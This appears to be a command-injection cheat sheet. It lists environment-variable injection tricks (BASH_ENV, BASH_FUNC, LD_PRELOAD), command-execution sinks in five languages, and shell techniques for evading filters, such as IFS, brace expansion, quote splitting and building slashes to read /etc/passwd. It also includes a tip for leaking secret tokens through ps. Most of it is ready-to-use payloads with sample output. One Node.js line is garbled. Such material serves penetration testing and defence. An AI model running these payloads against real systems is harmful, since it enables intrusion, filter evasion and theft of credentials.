# Environment variables

## BASH_ENV

You can use `BASH_ENV` with bash to achieve a command injection:

```bash
$ BASH_ENV='$(id 1>&2)' bash -c 'echo hello'
uid=0(root) gid=0(root) groups=0(root)
hello
```

References:
- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x06-bash_env)

## BASH_FUNC_*%%

You can use `BASH_FUNC_*%%` to initialize an anonymous function according to the value of the environment variable and give it a name. The following sample adds `myfunc` function to the bash context:

```bash
$ env $'BASH_FUNC_myfunc%%=() { id; }' bash -c 'myfunc'
uid=0(root) gid=0(root) groups=0(root)
```

Moreover, you can override an existing functions:

```bash
$ env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
uid=0(root) gid=0(root) groups=0(root)
hello
```

References:
- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x08)

## ENV

When you force the [dash](https://linux.die.net/man/1/dash) to behave interactively, dash will look for `ENV` environment variable and pass it into `read_profile` function:

```c
if ((shinit = lookupvar("ENV")) != NULL && *shinit != '\0') {
    read_profile(shinit);
}
```

`read_profile` will print the `ENV` content:

```bash
$ ENV='$(id 1>&2)' dash -i -c 'echo hello'
uid=0(root) gid=0(root) groups=0(root)
hello
```

You can gain the same result with `sh`:

```bash
$ ENV='$(id 1>&2)' sh -i -c "echo hello"
uid=0(root) gid=0(root) groups=0(root)
hello
```

References:
- [Research: How do I use environment variable injection to execute arbitrary commands](https://tttang.com/archive/1450/#toc_0x03-dash)

## GIT_*

The following `GIT_*` parameters can be used to abuse a git directory:

- [GIT_DIR](https://git-scm.com/book/en/v2/Git-Internals-Environment-Variables) is the location of the `.git` folder
- [GIT_PROXY_COMMAND](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coregitProxy) is used for overridding `core.gitProxy`
- [GIT_SSH_COMMAND](https://git-scm.com/docs/git-config#Documentation/git-config.txt-coresshCommand) is used for overridding `core.sshCommand`
- [GIT_EXTERNAL_DIFF](https://git-scm.com/docs/git-config#Documentation/git-config.txt-diffexternal) is used for overridding `diff.external`

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection/parameters-injection@abusing-a-git-directory" %}

## LD_PRELOAD

`LD_PRELOAD` is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library `libc.so`.

In Linux C, functions can be declared with attributes within the function definition. This is done by adding the desired attributes to the function definition. There are two attributes of interest, [constructor and destructor](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html). A function with the `constructor` attribute will run before the program executes `main()`. For shared objects, this would occur at load time. A function declared with the `destructor` attribute should run once `main()` has returned or `exit()` is called.

{% hint style="info" %}
LD_PRELOAD can be used to override the standard libc calls, check [Abusing LD_PRELOAD for fun and profit](https://www.sweharris.org/post/2017-03-05-ld-preload/)
{% endhint %}

In other words, you can compile a shared library to be invoked at load time and/or before return:

1. Reuse the following code for compiling a shared library:

    {% embed url="https://raw.githubusercontent.com/ProfessionallyEvil/LD_PRELOAD-run-at-load-time/main/src/inject.c" %}

2. Compile the shared library with the next command:

    ```bash
    $ gcc -Wall -O3 -fPIC -shared inject.c -o inject.so
    ```

3. Exploit:

```bash
$ LD_PRELOAD=./inject.so git -v

 [+] Inject.so Loaded!
 [*] PID: 1337
 [*] Process: /usr/bin/git

Unknown option: -v
usage: git [--version] [--help] [-C <path>] [-c name=value]
           [--exec-path[=<path>]] [--html-path] [--man-path] [--info-path]
           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]
           [--git-dir=<path>] [--work-tree=<path>] [--namespace=<name>]
           <command> [<args>]

 [-] Inject.so is being unloaded!
```

```bash
$ LD_PRELOAD=./inject.so id

 [+] Inject.so Loaded!
 [*] PID: 1337
 [*] Process: /usr/bin/id

uid=0(root) gid=0(root) groups=0(root)
```

```bash
$ LD_PRELOAD=./inject.so bash -c "echo 'hello'"

 [+] Inject.so Loaded!
 [*] PID: 1337
 [*] Process: /bin/bash

hello

 [-] Inject.so is being unloaded!
```

References:
- [LD_PRELOAD: How to Run Code at Load Time](https://www.secureideas.com/blog/2021/02/ld_preload-how-to-run-code-at-load-time.html)

# Languages

## Go

```golang
// os/exec Write
cmd := exec.Command("bash")
cmdWriter, _ := cmd.StdinPipe()
cmd.Start()
cmdWriter.Write([]byte("os command here\n"))
cmd.Wait()

// os/exec CommandContext
exec.CommandContext(ctx, "os command here", "arguments here").Run()

// os/exec Cmd
cmd := &exec.Cmd {
    Path: "os command here",
    Args: []string{ "arguments here" },
}
cmd.Start();

// os/exec Command
cmd := exec.Command(
    "os command here", 
    "arguments here",
)
cmd.Run()

// syscall Exec
execErr := syscall.Exec(
    "os command here", 
    "arguments here",
    os.Environ()
)
```

## Java

```java
// java.lang.Runtime exec
Runtime.getRuntime().exec("os command here");
java.lang.Runtime.getRuntime().exec("os command here");

// java.lang.Runtime loadLibrary
Runtime.getRuntime().loadLibrary("path to library here");
java.lang.Runtime.getRuntime().loadLibrary("path to library here");

// java.lang.ProcessBuilder
new ProcessBuilder(
    "os command here", 
    "arguments here"
).start();
new java.lang.ProcessBuilder(
    "os command here", 
    "arguments here"
).start();

// groovy.lang.GroovyShell
// see https://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyShell.html
GroovyShell shell = new GroovyShell();
shell.evaluate(...);
shell.parse(...);
shell.parseClass(...);

// javax.script.ScriptEngine eval
new ScriptEngineManager()
    .getEngineByExtension("js")
    .eval("js code here");
```

## Node.js

```javascript
// child_process, check https://nodejs.org/api/child_process.html

// exec
// https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
const { exec } = require('child_process');
exec('os command here');

// execSync
// https://nodejs.org/api/child_process.html#child_processexecsynccommand-options
const { execSync } = require('child_process');
execSync('os command here');

// execFile
// https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback
const { execFile } = require('child_process');
execFile('path to executable file', ['args here'], (error, stdout, stderr) => { /* ... */ });

// execFileSync
// https://nodejs.org/api/child_process.html#child_processexecfilesyncfile-args-options
const { execFileSync } = require('child_process');
execFileSync('path to executable fileere'], (error, stdout, stderr) => { /* ... */ });

// spawn
// https://nodejs.org/api/child_process.html#child_processspawncommand-args-options
const { spawn } = require('child_process');
spawn('command to run here', ['args here']);
spawn('os command here', { shell: true });

// spawnSync
// https://nodejs.org/api/child_process.html#child_processspawnsynccommand-args-options
const { spawnSync } = require('child_process');
spawnSync('command to run here', ['args here']);
spawnSync('os command here', { shell: true });
```

## Python

```python
# eval
eval("python expression here")
eval(compile("python expression here", "", "eval"))

# exec
exec("python code here")
exec(compile("python code here", "", "exec"))

# os.system
os.system("os command here")
# os.spawnlpe
os.spawnlpe(os.P_WAIT, "os command here")
# os.popen
os.popen("os command here")
# os.popen2
os.popen("os command here")

# subprocess.call
subprocess.call("os commnad here")
subprocess.call(["os commnad here", "arguments here"])
# subprocess.run
subprocess.run("os commnad here", shell=True)
subprocess.run(["os commnad here", "arguments here"], shell=True)
# subprocess.Popen
subprocess.Popen(["os commnad here", "arguments here"])
```

## Ruby

```ruby
# exec
exec("os command here")
exec(["os command here", "arguments here"])

# eval
eval("ruby expression here")

# Process.spawn
spawn("os command here")
Process.spawn("os command here")
# Process.exec
Process.exec("os command here")
Process.exec("os command here", "arguments here")

# system
system("os command here")

# backticks
`os command here`

# Kernel.open
# https://ruby-doc.org//core-2.2.0/Kernel.html#method-i-open
open("| os command here")

# Kernel.exec
Kernel.exec("os command here")

# open-uri.open
# https://sakurity.com/blog/2015/02/28/openuri.html
open("| os command here")

# Object.send
# https://bishopfox.com/blog/ruby-vulnerabilities-exploits
# additionally, check out Object.public_send
# https://apidock.com/ruby/Object/public_send
1.send("eval","`os command here`")
"".send("eval","`os command here`")

# %x command
%x os-command-here<SPACE>
%x os-command-here ;
%x(os-command-here)
%x|os-command-here|
%x{os-command-here}

# https://docs.ruby-lang.org/en/2.0.0/Open3.html
# Open3.popen3
Open3.popen3("os command here")
Open3.popen3(["os command here", "arguments here"])
# Open3.popen2(e)
Open3.popen2("os command here")
Open3.popen2(["os command here", "arguments here"])
Open3.popen2e("os command here")
Open3.popen2e(["os command here", "arguments here"])
# Open3.capture3
Open3.capture3("os command here")
# Open3.capture2(e)
Open3.capture2("os command here")
Open3.capture2e("os command here")
# Open3.pipeline(_r/_w/_rw/_start)
Open3.pipeline("os command here")
```

# Tips

## Brace expansion

Brace expansion is a mechanism by which arbitrary strings may be generated. Patterns to be brace expanded take the form of an optional preamble, followed by either a series of comma-separated strings or a sequence expression between a pair of braces, followed by an optional postscript. The preamble is prefixed to each string contained within the braces, and the postscript is then appended to each resulting string, expanding left to right. For instance:

```bash
$ echo a{d,c,b}e
ade ace abe
```

You can use brace expansion to create payloads:

```bash
$ {cat,/etc/passwd}
```

References:
- [Bash Reference Manual: 3.5.1 Brace Expansion](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion)

## Command substitution

Command substitution allows the output of a command to replace the command itself. Command substitution occurs when a command is enclosed as follows:

```bash
$(command)
`command`
```

Bash performs the expansion by executing command in a subshell environment and replacing the command substitution with the standard output of the command.

References:
- [Bash Reference Manual: 3.5.4 Command Substitution](https://www.gnu.org/software/bash/manual/bash.html#Command-Substitution)

## Characters encoding

There are several ways to work with encoded strings:

1. `$'string'` words:

    Words of the form `$'string'` are treated specially. The word expands to string, with backslash-escaped characters replaced as specified by the ANSI C standard.

    ```bash
    $ a=$'\x74\x65\x73\x74'; echo $a
    $ a=$'\164\145\163\164'; echo $a
    $ a=$'\u0074\u0065\u0073\u0074'; echo $a
    $ a=$'\U00000074\U00000065\U00000073\U00000074'; echo $a
    ```

2. `echo` command:

    `echo` provides `-e` option to interpret of backslash escapes. Note the recognized sequences depend on a version of `echo`, as well as the `-e` option may not be present at all.

    ```bash
    echo -e "\x74\x65\x73\x74"
    echo -e "\0164\0145\0163\0164"
    ```

3. `xxd` command:

    ```bash
    $ xxd -r -p <<< 74657374
    $ xxd -r -ps <(echo 74657374)
    ```

References:
- [Bash Reference Manual: 3.1.2.4 ANSI-C Quoting](https://www.gnu.org/software/bash/manual/bash.html#ANSI_002dC-Quoting)
- [echo man page](https://linux.die.net/man/1/echo)
- [xxd man page](https://linux.die.net/man/1/xxd)

## Leak command line arguments

If you have parameter injection in a cli command that has been passed sensitive parameters, such as tokens or passwords, you can try to leak the passed secret with `ps x -w`.

```bash
# you can inject arbitrary parameters to <injection here> part
$ command --user username --token SECRET_TOKEN <injection here>
# send the vulnerable command to background with &
# and catch the parameters with ps x -w
$ command --user username --token SECRET_TOKEN & ps x -w

    PID TTY      STAT   TIME COMMAND
   1337 ?        S      0:00 /usr/bin/command --user username --token SECRET_TOKEN
   1574 ?        R      0:00 ps x -w
```


This can be useful if the cli logs hide sensitive settings or sensitive data is not stored in the environment. 

This can be useful if the cli logs hide sensitive data or sensitive data is not stored in the environment (for instance, Github Actions provide variable interpolation `${{...}}` for injecting secrets, and you can't give access to secrets during execution). Another case is when you have blind injection and can redirect output of `ps x -w` to a file that you have access to.

## List of commands

Combine the execution of multiple commands using the operators `;`, `&`, `&&`, or `||`, and optionally terminated by one of `;`, `&`, or `\n`.

```bash
$ command1; command2
$ command1 & command2
$ command1 && command2
$ command1 || command2 # only if command1 fail
$ command1\ncommand2
```

Moreover, you can use pipelines for the same purposes:

```bash
$ command1 | command2 
$ command1 |& command2 
```

References:
- [Bash Reference Manual: 3.2.3 Pipelines](https://www.gnu.org/software/bash/manual/bash.html#Pipelines)
- [Bash Reference Manual: 3.2.4 Lists of Commands](https://www.gnu.org/software/bash/manual/bash.html#Lists)

## Producing slash with tr

```bash
$ echo . | tr '!-0' '"-1'
$ tr '!-0' '"-1' <<< .
$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

## Redirections

Redirect input and output before a command will be executed using the operators `>`, `>|`, `>>`, `<`, and etc.

```bash
$ ls > dirlist 2>&1
$ cat</etc/passwd
```

Supply a single string with a newline appended using the operator `<<<`.

```bash
$ base64 -d <<< dGVzdA==
```

References:
- [Bash Reference Manual: 3.6 Redirections](https://www.gnu.org/software/bash/manual/bash.html#Redirections)

## Shell parameter expansion

The basic form of parameter expansion is `${parameter}`; the value of parameter is substituted:

```bash
$ a="es"; echo "t${a}t"
```

More complex forms of parameter expansions allow you to perform various operations. For instance, you can extract substrings and use them to create payloads:

```bash
$ echo ${HOME:0:1}
$ cat ${HOME:0:1}etc${HOME:0:1}passwd
```

Additionally, match and replace can be useful when working with blacklists:

```bash
$ a=/eAAA/Atc/paAAA/Asswd; echo ${a//AAA\/A/}
```

References:
- [Bash Reference Manual: 3.5.3 Shell Parameter Expansion](https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion)
- [Bash scripting cheatsheet: Parameter expansions](https://devhints.io/bash#parameter-expansions)

## Special shell parameters

There are several parameters which the shell treats specially. Some of these parameters you can use to create payloads:

```bash
$ i$@d
# $0 expands to the name of the shell or shell script
$ bash -c 'echo id|$0'
```

References:
- [Bash Reference Manual: 3.4.2 Special Parameters](https://www.gnu.org/software/bash/manual/bash.html#Special-Parameters)

## Shell variables

Bash automatically assigns default values to a number of variables, such as `HOME` or `PATH`. Some of these variables can be used to create payloads. For instance, you can use `IFS` variable as a separator (this is possible since `IFS` contains a list of characters that separate fields):

```bash
$ cat$IFS/etc/passwd
$ echo${IFS}"test"
```

Moreover, you can override `IFS` and use any character as a separator:

```bash
$ IFS=,;`cat<<<uname,-a`
```

References:
- [Bash Reference Manual: 5 Shell Variables](https://www.gnu.org/software/bash/manual/bash.html#Shell-Variables)
- [Bash Reference Manual: 3.5.7 Word Splitting](https://www.gnu.org/software/bash/manual/bash.html#Word-Splitting)

## Tricks

```bash
# using single quotes in command names
$ w'h'o'am'i
# using double quotes in command names
$ w"h"o"am"i
# using backslashes and slahes in command names
$ w\ho\am\i
$ /\b\i\n/////s\h
```

# References

- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
